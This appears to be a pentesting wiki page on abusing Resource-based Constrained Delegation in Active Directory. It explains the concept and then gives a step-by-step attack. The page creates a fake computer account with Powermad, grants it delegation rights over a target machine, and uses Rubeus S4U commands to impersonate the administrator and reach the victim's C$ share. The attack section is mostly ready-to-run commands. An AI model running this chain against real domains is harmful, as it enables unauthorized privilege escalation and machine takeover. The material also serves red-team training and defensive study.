# Resource-based Constrained Delegation

## Basics of Resource-based Constrained Delegation

This is similar to the basic [Constrained Delegation](constrained-delegation.md) but **instead** of giving permissions to an **object** to **impersonate any user against a service**. Resource-based Constrain Delegation **sets** in **the object who is able to impersonate any user against it**.

In this case, the constrained object will have an attribute called _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ with the name of the user that can impersonate any other user against it.

Another important difference from this Constrained Delegation to the other delegations is that any user with **write permissions over a machine account** \(_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_\) ****can set the _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ \(In the other forms of Delegation you needed domain admin privs\).

### New Concepts

Back in Constrained Delegation it was told that the _**TrustedToAuthForDelegation**_ flag inside the _userAccountControl_  value of the user is needed to perform a **S4U2Self.** But that's not completely truth.  
The reality is that even without that value, you can perform a **S4U2Self** against any user if you are a **service** \(have a SPN\) but, if you **have** _**TrustedToAuthForDelegation**_  the returned TGS will be **Forwardable** and if you **don't have** that flag the returned TGS **won't** be **Forwardable**.

However, if the **TGS** used in **S4U2Proxy** is **NOT Forwardable** trying to abuse a **basic Constrain Delegation** it **won't work**. But if you are trying to exploit a **Resource-Based constrain delegation, it will work** \(this is not a vulnerability, it's a feature, apparently\).

### Attack structure

> If you have **write equivalent privileges** over a **Computer** account you can obtain **privileged access** in that machine.

Suppose that the attacker has already **write equivalent privileges over the victim computer**.

1. The attacker **compromises** an account that has a **SPN** or **creates one** \(“Service A”\). Note that **any** _Admin User_ without any other special privilege can **create** up ****until 10 **Computer objects \(**_**MachineAccountQuota**_**\)** and set them a **SPN**. So the attacker can just create a Computer object and set a SPN.
2. The attacker configures **resource-based constrained delegation from Service A to the victim host**. 
3. The attacker uses Rubeus to perform a **full S4U attack** \(S4U2Self and S4U2Proxy\) from Service A to Service B for a user **with privileged access to Service B**. 
   1. S4U2Self \(from the SPN compromised/created account\): Ask for a **TGS of Administrator to me** \(Not Forwardable\).
   2. S4U2Proxy: Use the **not Forwardable TGS** of the step before to ask for a **TGS** from **Administrator** to the **victim host**.
   3. Even if you are using a not Forwardable TGS, as you are exploiting Resource-based constrained delegation, it will work.
4. The attacker can **pass-the-ticket** and **impersonate** the user to gain **access to the victim**.

To check the _**MachineAccountQuota**_ of the domain you can use:

```text
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Attack

### Creating a Computer Object

You can create a computer object inside the domain using [powermad](https://github.com/Kevin-Robertson/Powermad)**:**

```csharp
import-module powermad
New-MachineAccount -MachineAccount FAKECOMPUTER -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

![](../../.gitbook/assets/b1.png)

```bash
Get-DomainComputer FAKECOMPUTER #Check if created if you have powerview
```

### Configuring R**esource-based Constrained Delegation**

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount FAKECOMPUTER$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it work
```

![](../../.gitbook/assets/b2.png)

### Performing a complete S4U attack

First of all, we created the new Computer object with the password `123456`, so we need the hash of that password:

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER /domain:domain.local
```

This will print the RC4 and AES hashes for that account.  
Now, the attack can be performed:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

![](../../.gitbook/assets/b3.png)

### Accessing

The last command line will perform the **complete S4U attack and will inject the TGS** from Administrator to the victim host in **memory**.  
In this example it was requested a TGS for the **CIFS** service from Administrator, so you will be able to access **C$**:

```bash
ls \\victim.domain.local\C$
```

![](../../.gitbook/assets/b4.png)

## References

{% embed url="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" %}

{% embed url="https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/" %}

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution\#modifying-target-computers-ad-object" %}

{% embed url="https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/" %}





